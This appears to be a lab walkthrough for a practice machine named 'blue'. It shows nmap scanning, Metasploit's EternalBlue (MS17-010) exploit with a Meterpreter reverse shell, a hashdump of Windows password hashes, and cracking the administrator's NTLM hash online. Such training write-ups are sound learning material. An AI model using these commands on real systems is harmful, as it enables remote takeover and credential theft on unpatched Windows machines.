user - administrator 
password - Password456! 

- check if you are able to ping the blue-machine , success = '0' packet loss 
```bash
ipconfig # on blue machine
```
- to check about port and services running on the target machine 
```bash
nmap -A <blue-ip-addr> 
```
- after the nmap scan we come to know that the target machine have -- Windows 7 Ultimate 
- now try to do some research from yourself, of how could you exploit the target and come back to see the solution if you don't get any  
- you see , even if we type "windows 7 ultimate" & "vulnerabilities" on the search bar, we get a long list of vulnerabilities and how to exploit them , one of them is the famous 'Eternal Blue' 
- so let's use it and exploit the machine 
- we will be using metasploit in the next steps to make a connection with the target machine so , if you don't have it on you device , install it first 
```bash
msfconsole
search eternal blue
#use 24 to check if our assumption is correct 
use 24 # auxiliary/scanner/smb/smb_ms17_010  
```

![[Screenshot 2026-07-27 at 4.37.16 PM.png]]
```bash
set rhosts <target-ip-addr>
check
```

![[Screenshot 2026-07-27 at 4.36.42 PM.png]]
- if you see the 'target is vulnerable' , time to exploit it 
```bash
use 0 # exploit/windows/smb/ms17_010_eternalblue
set rhosts # target-ip-addr
set lhost # your-ip-addr
set payload # windows/x64/meterpreter/reverse_tcp 
run
```
- after the successfull exploit , you will see a meterpreter session activates
```bash 
hashdump # will give passwords in form of hash-values of all the users of machine (blue) 
```

![[Screenshot 2026-07-27 at 3.49.37 PM.png]]

- let's decode this hashdump 
	- Username:RID:LM-Hash:NT-Hash:::
	-  **`Administrator`** – the user account
    - **`500`** – the RID (well-known admin ID)
    - **`aad3b435b51404eeaad3b435b51404ee`** – the LM hash. This value is the **null LM hash** and means LM hashing is disabled or the password is blank. You can ignore it.
    - **`58f5081696f366cdc72491a2c4996bd5`** – the **NTLM hash** you need to crack. 
- ntlm hash can be cracked via src - https://md5decrypt.net/en/Ntlm/ 
- the cracked hash is the password of the admin account 